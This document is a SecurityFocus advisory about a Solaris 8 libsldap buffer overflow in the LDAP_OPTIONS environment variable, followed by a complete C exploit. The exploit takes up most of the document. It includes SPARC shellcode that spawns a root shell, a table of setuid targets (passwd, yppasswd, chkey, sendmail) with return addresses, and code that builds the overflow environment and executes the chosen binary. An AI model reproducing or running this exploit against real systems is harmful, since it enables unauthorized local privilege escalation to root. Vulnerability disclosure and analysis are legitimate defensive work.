source: http://www.securityfocus.com/bid/2931/info

Solaris 8 ships with a shared library that implements LDAP functionality called 'libsldap'. This library is linked to by a number of system utilities, many of them installed setuid or setgid.

Libsldap contains a buffer overflow vulnerability in it's handling of the 'LDAP_OPTIONS' environment variable.

Local attackers can exploit this vulnerability in setuid/setgid programs linked to libsldap to elevate privileges. 

/** !!!PRIVATE!!! 
 ** noir@gsu.linux.org.tr
 ** libsldap.so.1 $LDAP_OPTIONS enviroment variable overflow exploit;
 ** 
 **/
  
#include <stdio.h>

#define ADJUST      1


/* anathema@hack.co.za
** Solaris/SPARC shellcode
** setreuid(0, 0); setregid(0, 0); execve("/bin/sh", args, 0);
*/

char shellcode[] =
"\x90\x1a\x40\x09\x92\x1a\x40\x09\x82\x10\x20\xca\x91\xd0\x20\x08"
"\x90\x1a\x40\x09\x92\x1a\x40\x09\x82\x10\x20\xcb\x91\xd0\x20\x08"
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
"\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
"\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08";

struct type {
char *string;
char *path;
long retaddr;
};

struct type target[] = 
      {
	{ "0, /usr/bin/passwd Solaris8, Sparc64", "/usr/bin/passwd", 0xffbefe98 },
	{ "1, /usr/bin/nispasswd Solaris8, Sparc64", "/usr/bin/nispasswd", 0xffbefe98 },
	{ "2, /usr/bin/yppasswd Solaris8, Sparc64", "/usr/bin/yppasswd", 0xffbefe98 },
	{ "3, /usr/bin/chkey Solaris8, Sparc64 ", "/usr/bin/chkey", 0xffbefea8 },
	{ "4, /usr/lib/sendmail Solaris8, Sparc64", "/usr/lib/sendmail", 0xffbefeb8 },
	{ NULL, NULL, 0 } 
      };

int i;
unsigned long ret_adr;
char ldap[4000];
char egg[400];
char *envs[] = { ldap, egg, NULL };

main(int argc, char *argv[])
{

      if(!argv[1])
      {
              fprintf(stderr, "libsldap.so.1 $LDAP_OPTIONS enviroment variable \
buffer overflow\nExploit code: noir@gsu.linux.org.tr\nBug discovery: sway@hack.co.za\n\nUsage: %s target#\n\n", argv[0]);
      for(i = 0; target[i].string != NULL; i++)
      fprintf(stderr,"target#: %s\n", target[i].string);
      exit(0); 
      }

  ret_adr = target[atoi(argv[1])].retaddr;
 
  memset(egg, 0x00, sizeof egg);
  for(i = 0 ; i < 400 - strlen(shellcode) ; i +=4)
  *(long *)&egg[i] =  0xa61cc013; 
  for (i= 0 ; i < strlen(shellcode); i++) 
     egg[200+i]=shellcode[i];
  
 for ( i = 0; i <  ADJUST; i++) ldap[i]=0x58;
 for (i = ADJUST; i < 4000; i+=4)
    {
      ldap[i+3]=ret_adr & 0xff;
      ldap[i+2]=(ret_adr >> 8 ) &0xff;
      ldap[i+1]=(ret_adr >> 16 ) &0xff;
      ldap[i+0]=(ret_adr >> 24 ) &0xff;
    }
memcpy(ldap, "LDAP_OPTIONS=", 13);
 
ldap[strlen(ldap) - 3] = 0x00; //ldap[3998] has to be NULL terminated

execle(target[atoi(argv[1])].path, "12341234", (char *)0, envs);

}


